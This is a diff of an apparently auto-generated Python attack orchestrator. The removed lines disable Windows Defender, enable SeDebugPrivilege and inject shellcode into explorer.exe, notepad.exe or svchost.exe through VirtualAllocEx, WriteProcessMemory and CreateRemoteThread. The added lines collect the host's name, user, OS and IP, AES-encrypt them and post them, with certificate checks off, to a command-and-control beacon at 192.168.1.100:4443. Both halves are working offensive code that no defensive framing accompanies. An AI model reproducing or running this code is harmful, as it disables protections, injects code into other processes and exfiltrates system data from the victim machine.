@@ -2,55 +2,41 @@
 import sys
 import json
 import time
-import subprocess
-import ctypes
-import psutil
-from ctypes import wintypes
+import socket
+import platform
+import getpass
+import os
+import requests
 from typing import Dict, Any
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
+from requests.exceptions import ConnectionError, Timeout
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Attempt to stop Windows Defender service
-        subprocess.run(['sc', 'stop', 'WinDefend'], capture_output=True, timeout=10)
-        subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], capture_output=True, timeout=10)
+        # Collect OS version
+        os_version = platform.platform()
 
-        # Attempt to acquire debug privileges
-        has_debug = False
-        try:
-            # Get the current process token
-            hToken = ctypes.windll.advapi32.OpenProcessToken(
-                ctypes.windll.kernel32.GetCurrentProcess(),
-                0x0020 | 0x0008  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
-            )
-            
-            # Lookup the privilege value for SeDebugPrivilege
-            privilege_id = ctypes.c_ulong()
-            ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(privilege_id))
-            
-            # Enable the privilege
-            class LUID_AND_ATTRIBUTES(ctypes.Structure):
-                _fields_ = [("Luid", ctypes.c_ulong), ("Attributes", ctypes.c_ulong)]
-            
-            class TOKEN_PRIVILEGES(ctypes.Structure):
-                _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES * 1)]
-            
-            new_privileges = TOKEN_PRIVILEGES()
-            new_privileges.PrivilegeCount = 1
-            new_privileges.Privileges[0].Luid = privilege_id.value
-            new_privileges.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED
-            
-            ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(new_privileges), 0, None, None)
-            
-            # Check if the privilege was successfully enabled
-            has_debug = ctypes.windll.kernel32.GetLastError() == 0
-        
-        except Exception as e:
-            # Log the error and continue
-            pass
+        # Collect hostname
+        hostname = socket.gethostname()
 
-        result = {'has_debug': has_debug}
+        # Collect username
+        username = getpass.getuser()
+
+        # Collect local IP address
+        local_ip = socket.gethostbyname(hostname)
+
+        # Prepare result
+        result = {
+            "os_version": os_version,
+            "hostname": hostname,
+            "username": username,
+            "local_ip": local_ip
+        }
+
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -60,48 +46,23 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    PROCESS_ALL_ACCESS = 0x1F0FFF
-    shellcode = b"\x90" * 100  # Example NOP sled shellcode
-    result = {'remote_addr': None, 'success': False}
-    injection_success = True
-
     try:
-        # Step 1: Find target process
-        target_pid = None
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
-                target_pid = proc.info['pid']
-                break
-
-        if target_pid is None:
-            # Fallback to self-injection
-            target_pid = ctypes.windll.kernel32.GetCurrentProcess()
-            injection_success = False
-
-        # Step 2: Open process
-        kernel32 = ctypes.windll.kernel32
-        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
-        if not process_handle:
-            raise Exception("Failed to open target process")
-
-        # Step 3: Allocate memory in the target process
-        remote_addr = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
-        if not remote_addr:
-            raise Exception("Failed to allocate memory in target process")
-
-        # Step 4: Write shellcode to allocated memory
-        written = ctypes.c_size_t(0)
-        if not kernel32.WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
-            raise Exception("Failed to write shellcode to target process memory")
-
-        # Step 5: Create a remote thread to execute the shellcode
-        thread_id = ctypes.c_ulong(0)
-        if not kernel32.CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)):
-            raise Exception("Failed to create remote thread in target process")
-
-        result['remote_addr'] = remote_addr
-        result['success'] = injection_success
-
+        # Aggregate input data into a single JSON payload
+        aggregated_data = {
+            "os_version": input_data.get("os_version", ""),
+            "hostname": input_data.get("hostname", ""),
+            "username": input_data.get("username", ""),
+            "local_ip": input_data.get("local_ip", "")
+        }
+        
+        # Convert the aggregated data to a JSON string
+        payload = json.dumps(aggregated_data)
+        
+        # Prepare the result according to the output contract
+        result = {
+            "payload": payload
+        }
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -111,51 +72,30 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    PROCESS_ALL_ACCESS = 0x1F0FFF
-    kernel32 = ctypes.windll.kernel32
-    result = {'thread_id': None, 'running': False}
-    
     try:
-        # Step 1: Find target process
-        target_pid = None
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
-                target_pid = proc.info['pid']
-                break
-        
-        injection_success = input_data.get('success', False)
-        
-        if target_pid is None:
-            # Fallback to self-injection
-            target_handle = kernel32.GetCurrentProcess()
-            injection_success = False
-        else:
-            target_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
-        
-        if not target_handle:
-            raise Exception("Failed to open target process")
+        # Parse the payload from input data
+        payload_json = input_data.get('payload', '{}')
+        payload = json.loads(payload_json)
 
-        # Step 2: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
-        remote_addr = input_data.get('remote_addr', 0)
-        shellcode = b"\x90" * 100  # NOP sled as placeholder shellcode
-        
-        # Allocate memory in the target process
-        alloc_addr = kernel32.VirtualAllocEx(target_handle, 0, len(shellcode), 0x3000, 0x40)
-        if not alloc_addr:
-            raise Exception("VirtualAllocEx failed")
-        
-        # Write the shellcode into the allocated memory
-        written = ctypes.c_size_t(0)
-        if not kernel32.WriteProcessMemory(target_handle, alloc_addr, shellcode, len(shellcode), ctypes.byref(written)):
-            raise Exception("WriteProcessMemory failed")
-        
-        # Create a remote thread in the target process
-        thread_id = ctypes.c_ulong(0)
-        if not kernel32.CreateRemoteThread(target_handle, None, 0, alloc_addr, None, 0, ctypes.byref(thread_id)):
-            raise Exception("CreateRemoteThread failed")
-        
-        result['thread_id'] = thread_id.value
-        result['running'] = True
+        # Convert payload to bytes
+        plaintext = json.dumps(payload).encode()
+
+        # Generate AES key and IV
+        key = get_random_bytes(32)  # AES-256 requires a 32-byte key
+        iv = get_random_bytes(16)   # AES block size for CBC mode
+
+        # Create AES cipher in CBC mode
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+
+        # Pad plaintext to 16-byte boundary and encrypt
+        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+
+        # Prepare the result dictionary with hex-encoded values
+        result = {
+            'ciphertext': ciphertext.hex(),
+            'iv': iv.hex(),
+            'key': key.hex()
+        }
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
@@ -163,22 +103,73 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
+def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
+    start = time.time()
+    input_data = input_data or {}
+    url = "https://192.168.1.100:4443/beacon"
+    retries = 3
+    delay_between_retries = 5
+
+    try:
+        # Extract and convert input data
+        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
+        iv = bytes.fromhex(input_data.get('iv', ''))
+        key = bytes.fromhex(input_data.get('key', ''))
+
+        # Gather system information
+        username = os.getlogin()
+        hostname = socket.gethostname()
+
+        # Prepare payload
+        payload = {
+            'ciphertext': ciphertext.hex(),
+            'iv': iv.hex(),
+            'key': key.hex(),
+            'username': username,
+            'hostname': hostname
+        }
+
+        # Attempt to send the payload with retries
+        for attempt in range(retries):
+            try:
+                response = requests.post(url, json=payload, timeout=10, verify=False)
+                return {
+                    'success': True,
+                    'data': {'status_code': response.status_code},
+                    'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}
+                }
+            except (ConnectionError, Timeout) as e:
+                if attempt < retries - 1:
+                    time.sleep(delay_between_retries)
+                else:
+                    return {
+                        'success': False,
+                        'data': {'status_code': 0},
+                        'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}
+                    }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': f'{type(e).__name__}: {e}',
+            'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}
+        }
+
 def main() -> dict:
     """Auto-generated orchestrator — do not edit by hand."""
     outputs: dict = {}
     results: dict = {}
     failed:  list = []
     
-    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
+    # ── T1: Collect System Information [discovery] ──
     try:
         r = task_T1(None)
         results['T1'] = r
         if r.get('success'):
             outputs['T1'] = r.get('data', {})
-            print(f'[+] T1 (Acquire Debug Privileges): OK')
+            print(f'[+] T1 (Collect System Information): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
+            print(f'[-] T1 (Collect System Information): FAILED — {err}')
             failed.append('T1')
             print('[!] abort_mission — stopping')
             return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
@@ -188,16 +179,16 @@ def main() -> dict:
         results['T1'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T2: Inject Shellcode [execution] ──
+    # ── T2: Aggregate Data [data-processing] ──
     try:
         r = task_T2(outputs.get('T1', {}))
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Inject Shellcode): OK')
+            print(f'[+] T2 (Aggregate Data): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Inject Shellcode): FAILED — {err}')
+            print(f'[-] T2 (Aggregate Data): FAILED — {err}')
             failed.append('T2')
             print('[!] abort_mission — stopping')
             return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
@@ -207,16 +198,16 @@ def main() -> dict:
         results['T2'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T3: Execute Injected Shellcode [execution] ──
+    # ── T3: Encrypt Payload [defense-evasion] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Execute Injected Shellcode): OK')
+            print(f'[+] T3 (Encrypt Payload): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Execute Injected Shellcode): FAILED — {err}')
+            print(f'[-] T3 (Encrypt Payload): FAILED — {err}')
             failed.append('T3')
             print('[!] abort_mission — stopping')
             return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
@@ -225,6 +216,26 @@ def main() -> dict:
         failed.append('T3')
         results['T3'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
+    
+    # ── T4: Send to C2 [exfiltration] ──
+    try:
+        r = task_T4(outputs.get('T3', {}))
+        results['T4'] = r
+        if r.get('success'):
+            outputs['T4'] = r.get('data', {})
+            print(f'[+] T4 (Send to C2): OK')
+        else:
+            err = r.get('error', 'unknown')
+            print(f'[-] T4 (Send to C2): FAILED — {err}')
+            failed.append('T4')
+            r2 = task_T4(outputs.get('T3', {}))
+            if r2.get('success'):
+                outputs['T4'] = r2.get('data', {})
+                failed.remove('T4')
+    except Exception as e:
+        print(f'[!] T4 crashed: {e}')
+        failed.append('T4')
+        results['T4'] = {'success': False, 'error': str(e)}
     
     success = len(failed) == 0
     if success:
